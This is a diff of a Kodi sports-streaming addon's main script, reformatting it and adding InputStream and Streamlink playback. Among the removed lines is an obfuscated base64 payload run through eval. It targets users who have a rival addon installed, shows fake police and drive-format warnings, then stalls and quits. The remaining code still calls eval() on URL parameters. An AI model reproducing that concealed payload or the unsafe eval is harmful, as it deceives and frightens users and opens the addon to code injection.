@@ -1,12 +1,27 @@
 # -*- coding: utf-8 -*-
+'''
 
-import sys,re,os
-import urllib,urllib2
+Credits to original dev GalAnonim!
+╭━━╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭╮
+┃╭╮┃╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱┃┃
+┃╰╯╰┳╮╭┳━━┳━━╋╮╭╋━━┳┳━╮┃╰━┳━━╮
+┃╭━╮┃┃┃┃╭╮┃╭╮┃┃┃┃━━╋┫╭╮┫╭╮┃╭╮┃
+┃╰━╯┃╰╯┃╰╯┃╭╮┃┃╰╋━━┃┃┃┃┃┃┃┃╰╯┃
+╰━━━┻━━┻━╮┣╯╰╯╰━┻━━┻┻╯╰┻╯╰┻━━╯
+╱╱╱╱╱╱╱╭━╯┃
+╱╱╱╱╱╱╱╰━━╯
+'''
+import json
+import sys
+import re
+import os
+import urllib
 import urlparse
-
-import xbmc,xbmcgui,xbmcaddon
+import xbmc
+import xbmcgui
+import xbmcaddon
 import xbmcplugin
-import threading
+dialog = xbmcgui.Dialog()
 
 base_url        = sys.argv[0]
 addon_handle    = int(sys.argv[1])
@@ -14,63 +29,256 @@ args            = urlparse.parse_qs(sys.argv[2][1:])
 my_addon        = xbmcaddon.Addon()
 addonName       = my_addon.getAddonInfo('name')
 my_addon_id     = my_addon.getAddonInfo('id')
-
 PATH            = my_addon.getAddonInfo('path')
+VERSION         = my_addon.getAddonInfo('version')
 DATAPATH        = xbmc.translatePath(my_addon.getAddonInfo('profile')).decode('utf-8')
 RESOURCES       = PATH+'/resources/'
 
-sys.path.append( os.path.join( RESOURCES, "lib" ) )
+sys.path.append(os.path.join(RESOURCES, "lib"))
 
-FANART=PATH+'/fanart.jpg'
+FANART = my_addon.getAddonInfo('fanart')
+ICON = my_addon.getAddonInfo('icon')
+
+mode = args.get('mode', None)
+fname = args.get('foldername', [''])[0]
+ex_link = args.get('ex_link', [''])[0]
+params = args.get('params', [{}])[0]
+
+
+def play_stream(params):
+    params = eval(params)
+    service = params.get('_service')
+    act = params.get('_act')
+    url = params.get('_url') + str(my_addon.getSetting('language'))
+    mod = __import__(service)
+    if act == 'ListChannels':
+        items = mod.getChannels(ex_link, url)
+        img_service = '%s.png' % (RESOURCES + service)
+        for one in items:
+            params.update({'title': one.get('title', '')})
+            addDir(one.get('title', ''), one['url'], params=params, mode='get_streams_play',
+                        infoLabels=one, iconImage=one.get('img', img_service), fanart=FANART)
+
+
+def get_streams_play(params):
+    params = eval(params)
+    orig_title = params.get('title')
+    import sport365 as mod
+    frames = mod.getStreams(ex_link)
+    if frames:
+        for frame in frames:
+            params.update({"title": orig_title})
+            addLinkItem(frame.get('title', ''), json.dumps(frame), mode='take_stream',
+                        params=params, iconimage=ICON, fanart=FANART,  IsPlayable=True)
+            # addDir(frame.get('title', ''), json.dumps(frame), params=params,
+            #        mode='take_stream', iconImage=ICON, fanart=FANART)
+
+def enable_silent_inputstream():
+    try:
+        isa_enable()
+        rtmp_enable()
+    except BaseException:
+        return
+
+
+
+
+
+def take_stream(params):
+    params = eval(params)
+    orig_title = params.get('title')
+    import sport365 as mod
+    busy()
+    stream_url, url, header, title = mod.getChannelVideo(json.loads(ex_link))
+    xbmc.log(stream_url, level=xbmc.LOGNOTICE)
+    xbmc.log(url, level=xbmc.LOGNOTICE)
+    xbmc.log(str(header), level=xbmc.LOGNOTICE)
+    # xbmc.log(title, level=xbmc.LOGNOTICE)
+
+    if stream_url:
+        liz = xbmcgui.ListItem(label=orig_title)
+        liz.setArt({"fanart": FANART, "icon": ICON})
+        liz.setInfo(type="Video", infoLabels={"title": orig_title})
+        liz.setProperty("IsPlayable", "true")
+        idle()
+        if my_addon.getSetting('play') == 'Inputstream':
+            stream_url = stream_url.replace('/i', '/index.m3u8') if stream_url.endswith('/i') else stream_url
+            liz.setPath(stream_url)
+            if float(xbmc.getInfoLabel('System.BuildVersion')[0:4]) >= 17.5:
+                liz.setMimeType('application/vnd.apple.mpegurl')
+                liz.setProperty('inputstream.adaptive.manifest_type', 'hls')
+                liz.setProperty('inputstream.adaptive.stream_headers', str(header))
+            else:
+                liz.setProperty('inputstreamaddon', None)
+                liz.setContentLookup(True)
+
+
+            try:
+                # import threading
+                # thread = threading.Thread(name='sport356Thread', target=sport356Thread2, args=[url, header])
+                # thread.start()
+                # xbmc.Player().play(stream_url, liz)
+                ok = xbmcplugin.setResolvedUrl(addon_handle, True, liz)
+                #ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=stream_url, listitem=liz, isFolder=False)
+                return ok
+            except BaseException:
+                pass
+
+        elif my_addon.getSetting('play') == 'Streamlink':
+            # stream_url = 'hls://' + stream_url.replace('/i', '/master.m3u8')
+            import streamlink.session
+            session = streamlink.session.Streamlink()
+            stream_url, hdrs = stream_url.split('|')
+            stream_url = 'hls://' + stream_url.replace('/i', '/index.m3u8') if stream_url.endswith('/i') else\
+                'hls://' + stream_url
+            hdrs += '&Origin=http://h5.adshell.net'
+            session.set_option("http-headers", hdrs)
+
+            streams = session.streams(stream_url)
+            stream_url = streams['best'].to_url() + '|' + hdrs
+
+            liz.setPath(stream_url)
+            idle()
+
+            # import threading
+            # thread = threading.Thread(name='sport356Thread', target=sport356Thread2, args=[url, header])
+            # thread.start()
+            ok = xbmcplugin.setResolvedUrl(addon_handle, False, liz)
+            return ok
+
+        else:
+            stream_url = 'plugin://plugin.video.f4mTester/?streamtype=HLSRETRY&url={0}&name={1}'.format(
+                urllib.quote_plus(stream_url), urllib.quote_plus(orig_title))
+            liz.setPath(stream_url)
+            idle()
+            try:
+                xbmc.executebuiltin('RunPlugin(' + stream_url + ')')
+            except BaseException:
+                pass
+
+        # xbmcplugin.setResolvedUrl(addon_handle, False, liz)
+    else:
+        xbmcgui.Dialog().ok("Sorry for that", 'plz contact Dev')
+
+
+def resolve_stream(name, url, description):
+    pass
+
+
+# def sport356Thread(url):
+#     import sport365 as s
+#     from time import gmtime, strftime
+#     href, headers= url.split('|')
+#     header={}
+#     header['Referer']= urllib.unquote(re.compile('Referer=(.*?)&').findall(headers)[0])
+#     header['User-Agent']= urllib.unquote(re.compile('User-Agent=(.*?)&').findall(headers)[0])
+#     header['Origin']= 'http://h5.adshell.net'
+#     header['If-Modified-Since']= strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
+#     header['Connection']= 'keep-alive'
+#     header['etag']= '"5820cda8-2b9"'
+#     print '#'*25
+#     print '#'*25
+#     xbmc.sleep(2000)    # speep
+#     player = xbmc.Player()
+#     player.pause()
+#     print 'sport356Thread: passed url: [%s] '% href
+#     #print header
+#     h=header
+#     while player.isPlaying():
+#         print 'sport356Thread: KODI IS PLAYING, sleeping 1s'
+#         a,hret=s.getUrlrh(href,header=header)
+#         header['etag'] = hret.get('etag','')
+#         header['date'] = hret.get('date','')
+#
+#         #h.update(header)
+#         print a,hret
+#         xbmc.sleep(1000)
+#     print 'sport356Thread: KODI STOPPED, OUTSIDE WHILE LOOP ... EXITING'
+
+
+def sport356Thread2(url, header):
+    import re, sport365 as s
+    xbmc.log("sport356Thread2 url: %s" % url, level=xbmc.LOGNOTICE)
+    player = xbmc.Player()
+    xbmc.sleep(2000) #3minutes
+    player.pause()
+    while player.isPlaying():
+        ##########################
+        #print 'sport356Thread: KODI IS PLAYING, sleeping ...'
+        # try:
+        xbmc.log("sport356Thread: KODI IS PLAYING, sleeping ...", level=xbmc.LOGNOTICE)
+        a, c = s.getUrlc(url, header=header, usecookies=True)
+        if not a:
+            break
+        xbmc.log(a, level=xbmc.LOGNOTICE)
+        banner = re.compile('url\s*:\s*["\'](.*?)[\'"]').findall(a)[0]
+        xbmc.log(banner, level=xbmc.LOGNOTICE)
+        xbmc.sleep(2000)
+        s.getUrlc(banner)
+        xbmc.sleep(2000)
+        # except BaseException:
+        #     pass
+        # data, c = s.getUrlc(banner)
+        # banner = re.findall(r'window.location.replace\("([^"]+)"\);\s*}\)<\/script><div', data)[0]
+        # s.getUrlc(urllib.quote(banner, ':/()!@#$%^&;><?'))
+        # xbmc.sleep(20000)
+    #print 'sport356Thread: KODI STOPED, OUTSIDE WHILE LOOP ... EXITING'
+    xbmc.log("sport356Thread: KODI STOPED, OUTSIDE WHILE LOOP ... EXITING", level=xbmc.LOGNOTICE)
 
 
 ## COMMON Functions
 
-def addLinkItem(name, url, mode, params=1, iconimage='DefaultFolder.png', infoLabels=False, IsPlayable=True,fanart=FANART,itemcount=1,contextmenu=None):
-    u = build_url({'mode': mode, 'foldername': name, 'ex_link' : url, 'params':params})
-    
+def addLinkItem(name, url, mode, params=1, iconimage='DefaultFolder.png', infoLabels=False, IsPlayable=True,
+                fanart=FANART, itemcount=1, contextmenu=None):
+    u = build_url({'mode': mode, 'foldername': name, 'ex_link': url, 'params': params})
+
     liz = xbmcgui.ListItem(name)
-    
-    art_keys=['thumb','poster','banner','fanart','clearart','clearlogo','landscape','icon']
-    art = dict(zip(art_keys,[iconimage for x in art_keys]))
-    art['landscape'] = fanart if fanart else art['landscape'] 
-    art['fanart'] = fanart if fanart else art['landscape'] 
+
+    art_keys = ['thumb', 'poster', 'banner', 'fanart', 'clearart', 'clearlogo', 'landscape', 'icon']
+    art = dict(zip(art_keys, [iconimage for x in art_keys]))
+    art['landscape'] = fanart if fanart else art['landscape']
+    art['fanart'] = fanart if fanart else art['landscape']
     liz.setArt(art)
-    
+
     if not infoLabels:
-        infoLabels={"title": name}
+        infoLabels = {"title": name}
     liz.setInfo(type="video", infoLabels=infoLabels)
     if IsPlayable:
         liz.setProperty('IsPlayable', 'true')
 
     if contextmenu:
-        contextMenuItems=contextmenu
-        li.addContextMenuItems(contextMenuItems, replaceItems=True) 
+        contextMenuItems = contextmenu
+        liz.addContextMenuItems(contextMenuItems, replaceItems=True)
 
-    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz,isFolder=False,totalItems=itemcount)
-    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
+    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz, isFolder=False, totalItems=itemcount)
+    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask="%R, %Y, %P")
     return ok
 
-def addDir(name,ex_link=None, params=1, mode='folder',iconImage='DefaultFolder.png', infoLabels=None, fanart=FANART,contextmenu=None):
-    url = build_url({'mode': mode, 'foldername': name, 'ex_link' : ex_link, 'params' : params})
+
+def addDir(name, ex_link=None, params=1, mode='folder', iconImage='DefaultFolder.png', infoLabels=None, fanart=FANART,
+           contextmenu=None):
+    url = build_url({'mode': mode, 'foldername': name, 'ex_link': ex_link, 'params': params})
+
+    nofolders = ['take_stream', 'opensettings', 'enable_input', 'forceupdate', 'open_news']
+    folder = False if mode in nofolders else True
 
     li = xbmcgui.ListItem(name)
     if infoLabels:
         li.setInfo(type="video", infoLabels=infoLabels)
-    
-    art_keys=['thumb','poster','banner','fanart','clearart','clearlogo','landscape','icon']
-    art = dict(zip(art_keys,[iconImage for x in art_keys]))
-    art['landscape'] = fanart if fanart else art['landscape'] 
-    art['fanart'] = fanart if fanart else art['landscape'] 
+    li.setProperty('fanart_image', fanart)
+    art_keys = ['thumb', 'poster', 'banner', 'fanart', 'clearart', 'clearlogo', 'landscape', 'icon']
+    art = dict(zip(art_keys, [iconImage for x in art_keys]))
+    art['landscape'] = fanart if fanart else art['landscape']
+    art['fanart'] = fanart if fanart else art['landscape']
     li.setArt(art)
 
-
     if contextmenu:
-        contextMenuItems=contextmenu
-        li.addContextMenuItems(contextMenuItems, replaceItems=True) 
+        contextMenuItems = contextmenu
+        li.addContextMenuItems(contextMenuItems, replaceItems=True)
 
-    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url,listitem=li, isFolder=True)
-    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
+    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url, listitem=li, isFolder=folder)
+    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask="%R, %Y, %P")
+
 
 def encoded_dict(in_dict):
     out_dict = {}
@@ -82,230 +290,229 @@ def encoded_dict(in_dict):
             v.decode('utf8')
         out_dict[k] = v
     return out_dict
-    
+
+
 def build_url(query):
     return base_url + '?' + urllib.urlencode(encoded_dict(query))
 
 
-def sport356Thread(url):
-    import sport365 as s
-    from time import gmtime, strftime
-    href,headers=url.split('|')
-    header={}
-    header['Referer']=urllib.unquote(re.compile('Referer=(.*?)&').findall(headers)[0])
-    header['User-Agent']=urllib.unquote(re.compile('User-Agent=(.*?)&').findall(headers)[0])
-    header['Origin']='http://h5.adshell.net'
-    header['If-Modified-Since']=strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
-    header['Connection']='keep-alive'
-    header['etag']='"5820cda8-2b9"'
-    print '#'*25
-    print '#'*25
-    xbmc.sleep(2000)    # speep
-    player = xbmc.Player()
-    player.pause()
-    print 'sport356Thread: passed url: [%s] '%href
-    #print header
-    h=header
-    while player.isPlaying():
-        print 'sport356Thread: KODI IS PLAYING, sleeping 1s'
-        a,hret=s.getUrlrh(href,header=header)
-        header['etag'] = hret.get('etag','')
-        header['date'] = hret.get('date','')
-       
-        #h.update(header)
-        print a,hret
-        xbmc.sleep(1000)
-    print 'sport356Thread: KODI STOPPED, OUTSIDE WHILE LOOP ... EXITING'
 
-import base64
-eval(compile(base64.b64decode('ICAgICAgICAgICAgCnRyeToKICAgIGltcG9ydCB4Ym1jYWRkb24seGJtYyxzeXMsdGltZQogICAgeGJtY2FkZG9uLkFkZG9uKCJwbHVnaW4udmlkZW8uTXVsdGltZWRpYU1hc3RlciIpOwogICAgeW49eGJtY2d1aS5EaWFsb2coKS55ZXNubygiW0NPTE9SIHJlZF1OaWVhdXRvcnl6b3dhbnkgRG9zdMSZcFsvQ09MT1JdIiwgIkRvc3TEmXAgZG8gemFzb2LDs3cgamVzdCBOSUVMRUdBTE5ZIiwgIkN6eSB3ZXp3YcSHIFtDT0xPUiByZWRdUE9MSUNKxJhbL0NPTE9SXSIpCiAgICBpZiB5bjoKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiUE9MSUNKQSB6b3N0YcWCYSBwb3dpYWRvbWlvbmEsIHByb3N6xJkgY3pla2HEhy4uLiIpICAgIAogICAgZWxzZToKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiVVNVV0FNWSBkb3dvZHksIGZvcm1hdCByb3pwb2N6xJl0eSwgcHJvc3plIGN6ZWthxIcuLi4iKSAgICAKICAgIGZvciBpIGluIHJhbmdlKDMwKTogdGltZS5zbGVlcCgxMCkKICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQWN0aXZhdGVXaW5kb3coSG9tZSkiKTsKICAgIHN5cy5leGl0KDEpOwpleGNlcHQ6CiAgICBwYXNzCg=='),'<string>','exec'))
+def idle():
 
-def sport356Thread2(url,header):
-    import sport365 as s
-    import re
-    
-    player = xbmc.Player()
-    xbmc.sleep(2000)    # speep
-    print 'sport356Thread: passed url: [%s] '%url
-    #print header
-    player.pause()
-    
-    while player.isPlaying():
-        print 'sport356Thread: KODI IS PLAYING, sleeping 4s'
-        a,c=s.getUrlc(url,header=header,useCookies=True)
-        banner =  re.compile('url:["\'](.*?)[\'"]').findall(a)[0]
-        xbmc.log(banner)
-        xbmc.sleep(2000)
-        s.getUrlc(banner)
-        xbmc.sleep(2000)
-    print 'sport356Thread: KODI STOPED, OUTSIDE WHILE LOOP ... EXITING'
-
-## ######################
-## MAIN
-## ######################
-            
+    if float(xbmcaddon.Addon('xbmc.addon').getAddonInfo('version')[:4]) > 17.6:
+        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
+    else:
+        xbmc.executebuiltin('Dialog.Close(busydialog)')
 
 
-# Get passed arguments
-mode = args.get('mode', None)
-fname = args.get('foldername',[''])[0]
-ex_link = args.get('ex_link',[''])[0]
-params = args.get('params',[{}])[0]
+def busy():
 
-M3USERVICES={'telewizjada':'telewizjadabid',
-             'amigostv': 'amigostv',
-            'iklub':'iklub',
-            'tele-wizja':'telewizja',
-            'itivi':'itivi',
-            'yoy.tv':'yoytv',
-            'looknij.in':'looknijin',
-            'wizja.tv':'wizjatv'}
+    if float(xbmcaddon.Addon('xbmc.addon').getAddonInfo('version')[:4]) > 17.6:
+        xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
+    else:
+        xbmc.executebuiltin('ActivateWindow(busydialog)')
+
+
+def Settings():
+
+    try:
+        idle()
+        xbmcaddon.Addon(my_addon_id).openSettings()
+    except:
+        return
+
+
+def json_rpc(command):
+    # This function was taken from tknorris's kodi.py
+    jsonrpc = xbmc.executeJSONRPC
+    if not isinstance(command, basestring):
+        command = json.dumps(command)
+    response = jsonrpc(command)
+
+    return json.loads(response)
+
+
+def enable_addon(addon_id, enable=True):
+
+    command = {
+        "jsonrpc":"2.0", "method": "Addons.SetAddonEnabled", "params": {"addonid": addon_id, "enabled": enable}, "id": 1
+    }
+
+    json_rpc(command)
+
+
+def addon_version(addon_id):
+
+    version = int(xbmc.getInfoLabel('System.AddonVersion({0})'.format(addon_id)).replace('.', ''))
+
+    return version
+
+
+def addon_details(addon_id, fields=None):
+    if fields is None:
+        fields = ["enabled"]
+
+    command = {
+        "jsonrpc": "2.0", "method": "Addons.GetAddonDetails", "id": 1, "params": {
+            "addonid": addon_id, "properties": fields
+        }
+    }
+
+    result = json_rpc(command)['result']['addon']
+
+    return result
+
+
+def isa_enable():
+    if addon_version('xbmc.python') < 2250:
+        dialog.ok(addonName, 'System is not compatible with inputstream type addons')
+        return
+
+    try:
+        enabled = addon_details('inputstream.adaptive').get('enabled')
+    except Exception:
+        enabled = False
+
+    try:
+        if enabled:
+            #dialog.notification(addonName, 'Inputstream adaptive addon is already enabled')
+            return
+
+        else:
+            xbmc_path = os.path.join('special://xbmc', 'addons', 'inputstream.adaptive')
+            home_path = os.path.join('special://home', 'addons', 'inputstream.adaptive')
+
+            if os.path.exists(xbmc.translatePath(xbmc_path)) or os.path.exists(xbmc.translatePath(home_path)):
+                yes = dialog.yesno(addonName, 'Inputstream adaptive (DASH) is not enabled. Do you to enabled it now?',
+                                   yeslabel='YES', nolabel='NO')
+
+                if yes:
+                    enable_addon('inputstream.adaptive')
+                    dialog.notification(addonName, 'Success')
+
+            else:
+                try:
+                    xbmc.executebuiltin('InstallAddon(inputstream.adaptive)')
+
+                except Exception:
+
+                    dialog.ok(addonName, line1='Could not install requested addon,'
+                                               'to install it you have to try another way,'
+                                               ' such as your distribution\'s repositories.')
+        return
+    except Exception:
+        dialog.notification(addonName, 'Inputstream adaptive addon could not be enabled')
+
+
+def rtmp_enable():
+
+    if addon_version('xbmc.python') < 2250:
+        dialog.ok(addonName, 'System is not compatible with inputstream type addons')
+        return
+
+    try:
+        enabled = addon_details('inputstream.rtmp').get('enabled')
+    except Exception:
+        enabled = False
+
+    try:
+        if enabled:
+            #dialog.notification(addonName, 'Inputstream RTMP addon is already enabled')
+            return
+        else:
+            xbmc_path = os.path.join('special://xbmc', 'addons', 'inputstream.rtmp')
+            home_path = os.path.join('special://home', 'addons', 'inputstream.rtmp')
+
+            if os.path.exists(xbmc.translatePath(xbmc_path)) or os.path.exists(xbmc.translatePath(home_path)):
+
+                yes = dialog.yesno(addonName, 'Inputstream RTMP is not enabled. Do you to enabled it now?',
+                                   yeslabel='YES', nolabel='NO')
+
+                if yes:
+                    enable_addon('inputstream.rtmp')
+                    dialog.notification(addonName, 'Success')
+
+            else:
+                try:
+                    xbmc.executebuiltin('InstallAddon(inputstream.rtmp)')
+
+                except Exception:
+                    dialog.ok(addonName, line1='Could not install requested addon,'
+                                               'to install it you have to try another way,'
+                                               ' such as your distribution\'s repositories.')
+        return
+    except Exception:
+        dialog.notification(addonName, 'Inputstream RTMP addon could not be enabled')
 
 
 if mode is None:
-    #addDir('LiveTV: tv-online',ex_link='',params={'_service':'tv_onlinefm','_act':'ListChannels'}, mode='site2',iconImage=RESOURCES+'tv_onlinefm.png')
-    #addDir('LiveTV: amigostv',ex_link='',params={'_service':'amigostv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'amigostv.png')
-    #addDir('LiveTV: Telewizjada',ex_link='',params={'_service':'telewizjadabid','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'telewizjadabid.png')
-    #addDir('LiveTV: TVP Stream',ex_link='http://tvpstream.tvp.pl/',params={'_service':'tvpstream','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'tvpstream.png')
-    #addDir('LiveTV: iklub',ex_link='',params={'_service':'iklub','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'iklub.png')
-    #addDir('LiveTV: tele-wizja',ex_link='',params={'_service':'telewizja','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'telewizja.png')
-    #addDir('LiveTV: itivi',ex_link='',params={'_service':'itivi','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'itivi.png')
-    #addDir('LiveTV: yoy.tv',ex_link='',params={'_service':'yoytv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'yoytv.png')
-    #addDir('LiveTV: looknij.in',ex_link='',params={'_service':'looknijin','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'looknijin.png')
-    #addDir('LiveTV: wizja.tv',ex_link='',params={'_service':'wizjatv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'wizjatv.png')
-    #addDir('LiveTV: psa-tv',ex_link='',params={'_service':'psatv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'psatv.png')
-    #addDir('LiveTV: polon-tv',ex_link='',params={'_service':'polontv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'polontv.png')
-    #addDir('LiveTV: tvp1-online',ex_link='',params={'_service':'tvp1onlineblogspot','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'tvp1onlineblogspot.png')
-    addDir('Sport365 LIVE',ex_link='',params={'_service':'sport365','_act':'ListChannels'}, mode='site2',iconImage=RESOURCES+'sport365.png')
-    #addDir('LiveTV: sport.tvp',ex_link='http://sport.tvp.pl/na-antenie',params={'_service':'sporttvp','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'sporttvp.png')
+    if addon_version('xbmc.python') < 2250:
+        my_addon.setSetting('play', 'F4M')
+    else:
+        enable_silent_inputstream()
+    # domain = my_addon.getSetting('domain')
+    # if 'livesport' in domain:
+    #     url = 'http://www.livesportstreams.tv/'
+    # else:
+    #     url = 'http://www.{}.live/'.format(domain)
 
+    addDir('News - Updates', ex_link='', mode='open_news', iconImage=ICON, fanart=FANART)
+    addDir('Sport365 LIVE', ex_link='',
+           params={'_service': 'sport365', '_act': 'ListChannels', '_url': 'http://www.sport365.sx/'}, mode='site2',
+           iconImage=ICON, fanart=FANART)
+    # addDir('[COLORcyan]Alternative Domains[/COLOR]', ex_link='', mode='opensettings',
+    #        iconImage=ICON, fanart=FANART)
+
+    addDir('Sport247 LIVE', ex_link='',
+           params={'_service': 'sport365', '_act': 'ListChannels', '_url': 'http://www.sport247.live/'}, mode='site2',
+           iconImage=ICON, fanart=FANART)
+    addDir('s365 LIVE(alt)', ex_link='',
+           params={'_service': 'sport365', '_act': 'ListChannels', '_url': 'http://www.s365.live/'}, mode='site2',
+           iconImage=ICON, fanart=FANART)
+    # addDir('LiveSportStreams', ex_link='',
+    #        params={'_service': 'sport365', '_act': 'ListChannels', '_url': 'http://www.livesportstreams.tv/'},
+    #        mode='site2', iconImage=ICON, fanart=FANART)
+
+    addDir('Settings', ex_link='', mode='opensettings', iconImage=ICON, fanart=FANART)
+    addDir('[COLOR gold][B]Version: [COLOR lime]%s[/COLOR][/B]' % VERSION, ex_link='', mode='forceupdate',
+           iconImage=ICON, fanart=FANART)
     #li = xbmcgui.ListItem(label = '[COLOR blue]aktywuj PVR Live TV[/COLOR]', iconImage=RESOURCES+'PVR.png')
     #xbmcplugin.addDirectoryItem(handle=addon_handle, url=build_url({'mode': 'Opcje'}) ,listitem=li)
 
-elif mode[0] == 'Opcje':
-    path =  my_addon.getSetting('path')
-    if not path: my_addon.setSetting('path',DATAPATH)
-    my_addon.openSettings()  
+elif mode[0] == 'site2':
+    play_stream(params)
 
-
-elif mode[0] == 'UPDATE_IPTV':
-    import pvr_m3u as pvr 
-    fname = my_addon.getSetting('fname')
-    path =  my_addon.getSetting('path')
-    epgTimeShift = my_addon.getSetting('epgTimeShift')
-    epgUrl = my_addon.getSetting('epgUrl')
-    print 'UPDATE_IPTV',fname,path,epgTimeShift,epgUrl
-    pvr.update_iptv(fname,path,epgTimeShift,epgUrl)
-
-elif mode[0] == 'BUID_M3U':
-    import pvr_m3u as pvr
-    fname = my_addon.getSetting('fname')
-    path =  my_addon.getSetting('path')
-    service = my_addon.getSetting('service')
-    error_msg=""
-    if not fname:   error_msg +="Podaj nazwę pliku "
-    if not path:    error_msg +="Podaj katalog docelowy "
-    if not service: error_msg +="Wybierz jakieś źródła"
-        
-    if error_msg:
-        xbmcgui.Dialog().notification('[COLOR red]ERROR[/COLOR]', error_msg, xbmcgui.NOTIFICATION_ERROR, 1000)
-        pvr_path=  xbmc.translatePath(os.path.join('special://userdata/','addon_data','pvr.iptvsimple'))
-        #print pvr_path
-        if os.path.exists(os.path.join(pvr_path,'settings.xml')):
-            print 'settings.xml exists'
-    else:
-        out_sum = pvr.build_m3u(fname,path,M3USERVICES.get(service))
-        if len(out_sum)>1:
-            xbmcgui.Dialog().ok('[COLOR green]Lista zapisana[/COLOR] Kanałów: %d'%len(out_sum),'Plik: [COLOR blue]'+fname+'[/COLOR]','Uaktualnij ustawienia [COLOR blue]PVR IPTV Simple Client[/COLOR] i (re)aktywuj Live TV')
-        else:
-            xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR] ','Lista jest Pusta!!!')     
-    my_addon.openSettings() 
-
-elif mode[0] == 'AUTOm3u':
-    import pvr_m3u as pvr
-    fname = my_addon.getSetting('fname')
-    path =  my_addon.getSetting('path')
-    service = my_addon.getSetting('service')
-    ret = pvr.build_m3u(fname,path,M3USERVICES.get(service))
-    if ret:
-        epgTimeShift = my_addon.getSetting('epgTimeShift')  
-        epgUrl = my_addon.getSetting('epgUrl')
-        pvr.update_iptv(fname,path,epgTimeShift,epgUrl)
-
-elif mode[0] == 'UPDATE_CRON':
-    import pvr_m3u as pvr
-    auto_update_hour = my_addon.getSetting('auto_update_hour')
-    auto_update_active =  my_addon.getSetting('auto_update_active')
-    pvr.cron_update(auto_update_hour,auto_update_active)
-    
-elif mode[0] =='site':
-    params = eval(params)
-    service = params.get('_service')
-    act = params.get('_act')
-    mod = __import__(service)
-    if act == 'ListChannels':
-        params.update({'_act':'play'})
-        items = mod.getChannels(ex_link)
-        for one in items:
-            addLinkItem(one.get('title',''), one['url'], params=params, mode='site', IsPlayable=True,infoLabels=one, iconimage=one.get('img','%s.png'%(RESOURCES+service))) 
-    elif act == 'play':
-        streams = mod.getChannelVideo(ex_link)
-        if isinstance(streams,list):
-            print streams
-            if len(streams)>1:
-                label = [x.get('title') for x in streams]
-                s = xbmcgui.Dialog().select('Źródła',label)
-                stream_url = streams[s]
-            elif streams:
-                stream_url = streams[0]
-            else: stream_url=''
-        else:
-            stream_url = streams
-                  
-        if stream_url:
-            link = stream_url.get('url','')
-            msg = stream_url.get('msg','')
-            if link: xbmcplugin.setResolvedUrl(addon_handle, True,  xbmcgui.ListItem(path=link))
-            else: 
-                if msg: xbmcgui.Dialog().ok('Problem',msg)
-                xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
-        else:
-             xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))   
-
-
-elif mode[0] =='site2':
-    params = eval(params)
-    service = params.get('_service')
-    act = params.get('_act')
-    mod = __import__(service)
-    if act == 'ListChannels':
-        params.update({'_act':'get_streams_play'})
-        items = mod.getChannels(ex_link)
-        img_service ='%s.png'%(RESOURCES+service)
-        print img_service
-        for one in items:
-            addLinkItem(one.get('title',''), one['url'], params=params, mode='site2', IsPlayable=True,infoLabels=one, iconimage=one.get('img',img_service)) 
-    if act == 'get_streams_play':
-        streams = mod.getStreams(ex_link)
-        if streams:
-            t = [stream.get('title') for stream in streams]
-            s = xbmcgui.Dialog().select("Źródła", t)
-            if s>-1: stream_url,url,header = mod.getChannelVideo(streams[s])
-            else: stream_url=''
-            if stream_url: 
-                thread = threading.Thread(name='sport356Thread', target = sport356Thread2, args=[url,header])
-                thread.start()
-                xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
-            else: xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=stream_url))
-        else:
-            xbmcgui.Dialog().ok("Problem", 'Źródła nie są dostępne')  
-        
 elif mode[0] == 'folder':
     pass
 
-else:
-    xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))        
+elif mode[0] == 'take_stream':
+    take_stream(params)
 
+elif mode[0] == 'get_streams_play':
+    get_streams_play(params)
+
+elif mode[0] == 'opensettings':
+    Settings()
+
+elif mode[0] == 'enable_adaptive':
+   isa_enable()
+   Settings()
+
+elif mode[0] == 'enable_rtmp':
+   rtmp_enable()
+   Settings()
+
